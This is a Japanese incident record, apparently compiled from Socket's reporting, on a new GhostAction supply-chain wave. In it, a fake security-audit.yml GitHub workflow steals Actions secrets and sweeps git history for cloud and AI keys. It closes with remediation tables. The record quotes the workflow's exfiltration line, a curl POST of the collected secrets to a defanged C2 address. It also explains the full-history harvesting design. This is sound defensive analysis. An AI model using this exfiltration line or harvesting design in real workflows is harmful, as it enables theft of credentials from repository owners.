INC-2026-0455GhostAction 新波が履歴の鍵まで掃く

GhostAction キャンペーンの新たな波で、侵害されたメンテナのアカウントから security-audit.yml という名の偽ワークフローが346リポジトリへ一括コミットされ、 従来の GitHub Actions シークレット窃取に加えて作業ツリーと git 全履歴から AWS・Anthropic・OpenAI 等13種のクラウド／AI 資格情報を掃き出す機能が追加—— 公開後に500超のアカウント・数万リポジトリへ拡大

脅威・攻撃キャンペーン委託先・再委託先起因で委託元多数に波及続報が続いている有名事象として記録（日本と直接の関係は薄い）認証情報の悪用（使い回し・推測可能・窃取）設計・実装上の不備ガバナンス・組織文化（ガイドライン理解不足・丸投げ等）
初報: 2026年10月9日（Socket のブログ公表。同日に追記あり） 最終更新: 2026年10月10日

Socket は2026年10月9日、サプライチェーン攻撃キャンペーン「GhostAction」の新たな波を公表した。 2026年10月8日、侵害された2つの GitHub メンテナアカウント（henrywoo・kitao）から、.github/workflows/security-audit.yml という単一ファイルのコミットが346リポジトリへ送り込まれた。対象には Uber 所有の uber/athenadriver と、スター18,420の kitao/pyxel が含まれる。

このワークフローにセキュリティ上の機能は無い。 資格情報を集めて単一の固定 IP アドレス（193.32.204[.]199）へ平文で POST する。

従来の波との違いは、狙う鍵の範囲である。 2025年9月に GitGuardian が記録した GhostAction は GitHub Actions のシークレットだけを取った。本変種はその機能を保ったまま、fetch-depth: 0 で全ブランチ・全タグを取得し、作業ツリーと git log -p --all の全履歴に対して13種の資格情報パターンを走らせる機能を追加した——AWS のアクセスキー ID／シークレットアクセスキー／STS セッショントークン、Anthropic（sk-ant-）・OpenAI（sk-proj-）・OpenRouter の API キー、GitHub／GitLab の個人アクセストークン、Google/Firebase/GCP の API キー、Slack トークン、SendGrid の API キー。

最も作り込まれているのは AWS 向けの2つの前後文抽出である。 AKIA／ASIA で始まるアクセスキー ID の前後2行を作業ツリーと履歴の両方から切り出す。キー ID 単体では認証できないため、1〜2行離れた場所にある40文字のシークレットアクセスキーごと鍵対として回収する設計である。

影響はその後拡大した。 Socket は公開後の追記で、2026年10月7日以降に500超の GitHub アカウントが同じ悪性ワークフローを数万リポジトリへコミットしていると述べている（侵害された貢献者経由で組織所有のリポジトリにも到達）。

本記録が構造上の中心として評価したのは2点である。 ①「履歴に一度でも入れた鍵」が攻撃対象として明確に組み込まれた（本記録の判断）—— 既定ブランチから消したつもりの鍵が、到達可能なブランチやタグから回収される。Actions シークレットの入れ替えでは、この露出は何も解消しない。 ②偵察を要する半分と、要しない半分が1つのファイルに同居している（本記録の指摘）—— 履歴掃きは偵察を要さないため、同一の静的ファイルを346リポジトリへ短時間で展開できた。

攻撃の経過

公表された範囲の事実のみ。公表されていない段階は補完せず明示しています。

**Socket は本キャンペーンを3段に分けている**—— **「The campaign has three stages, only one of which lives in the workflow file」（キャンペーンには3つの段階があり、 そのうち1つだけがワークフローファイルの中にある）** （原文英語。本記録の訳）。 ①**攻撃者がメンテナアカウントの有効な資格情報を入手する （入手方法は Socket も観測していない）。** ②**各リポジトリが実際に使っている Actions シークレットの名前を偵察し、 その名前をペイロードに埋め込んでからコミットする。** ③**ワークフローを既定ブランチへ直接コミットし、次の push で実行される。** **ワークフローの中身は2つの半分でできている**（Socket の分類）—— **継承された半分（Actions シークレットの窃取。初期の GhostAction と同じ）と、 追加された半分（作業ツリーと git 全履歴に対する13種の資格情報の掃き出し）。** **両者は単一の変数に連結され、1回の HTTP POST で送出される**—— **「a defender reading network data sees one POST carrying two unrelated classes of secret」（ネットワークデータを見る防御側には、 無関係な2種類のシークレットを運ぶ1つの POST が見える）** （原文英語。本記録の訳）。 **本記録の読みは次のとおりである**—— **本変種の要点は、偵察を要する半分と要しない半分が1ファイルに同居したことである** （本記録の判断）—— **履歴掃きは偵察を要さないため、同一の静的ファイルを 346リポジトリへ短時間で展開できた。** **そして Socket が指摘するとおり、2つの露出は対策も互いに効かない**—— **「Rotating Actions secrets does nothing for a committed-credential exposure, and scanning the working tree does nothing for an Actions-secret exposure」（Actions シークレットの入れ替えは コミットされた資格情報の露出に何の効果もなく、 作業ツリーの走査は Actions シークレットの露出に何の効果もない）** （原文英語。本記録の訳）

fetch-depth: 0 is what makes it possible. The default checkout fetches a single shallow branch; depth zero fetches every branch and tag, which gives git log -p --all the full patch text of the repository's history to read, including commits that were rewritten off the default branch but remain reachable from a stale branch or tag.   curl -s -m 20 -X POST --data-binary "$full" "hxxp://193.32.204[.]199/?c=monami" || true
fi

本記録が読み取った設計上の点は4つである（本記録の判断）。

  1. 両方の半分が単一の変数 full に連結され、1回の POST で出る。 Socket の言葉では—— 「ネットワークデータを見る防御側には、無関係な2種類のシークレットを運ぶ1つの POST が見える」（原文英語。本記録の訳）。
  2. 本文が空でないときだけ送信する。 何も取れなかったリポジトリでは通信が発生しない（本記録の読み）—— C2 側のログに無駄が出ない。
  3. || true が付いている。 送信が失敗してもジョブは成功のまま終わる（本記録の読み）—— 実行履歴上で失敗として目立たない。 Socket が「完了した実行は情報流出とみなす」ことを推奨しているのは妥当だが、「成功」は送信の成否を保証しない（本記録の指摘）。
  4. 宛先はハードコードされた単一の IP への平文 HTTP である。 検知は容易だが、IP は容易に変えられる（本記録の評価）。

対応は2系統——どちらか片方を終えて「対応済み」としないこと再発防止

Socket は対応を露出の種別ごとに分けて示している（本記録の整理）。

①Actions シークレットが漏えいした可能性がある場合

対応 内容
入れ替え ワークフローが参照していたシークレットをすべて入れ替える。PAT は失効させる
配布基盤の確認 PyPI・crates.io で、露出期間中およびその後に出た想定外のバージョンを確認し、自前のビルド成果物と照合する
実行履歴 注入されたワークフローの実行履歴を確認し、完了した実行は情報流出とみなす

②リポジトリ内に資格情報が残っていた可能性がある場合

対応 内容
走査 HEAD だけでなく git log -p --all で全履歴を確認し、到達不能なオブジェクトも含める
入れ替え 履歴に一度でも現れた資格情報は露出したものとして、対象13カテゴリすべてを入れ替える
クラウド側 AWS キーが見つかった場合は CloudTrail で、露出期間中と以後の不審な IAM ユーザー・アクセスキー・リージョンを確認する

③共通

  • 影響を受けたリポジトリ（組織所有のものを含む）から該当ファイルを削除し、コミットを revert する。
  • アカウント侵害を前提に、セッション・PAT・OAuth 許可・SSH 鍵を失効させ、耐フィッシング性の高い多要素認証を再登録する。
  • 組織の監査ログで該当時間帯の push を調べ、アカウントが書き込める全リポジトリで同名ファイルの追加を探す。
  • 送信ログ（セルフホストランナーの範囲を含む）で C2 への通信を探し、遮断する。
  • secret scanning と push protection を有効化し、外部共同作業者によるワークフロー実行には承認を求める。
  • フォークの管理者は、影響を受けた名前空間から取得したフォークでActions を有効にする前に、該当ワークフローの有無を確認する。

本記録が最後に置く指摘は1つである（本記録の判断）。①と②は別の作業であり、片方を終えて「対応済み」としてはならない。 Socket の結論をもう一度置く——

Rotating Actions secrets does nothing for a committed-credential exposure, and scanning the working tree does nothing for an Actions-secret exposure.
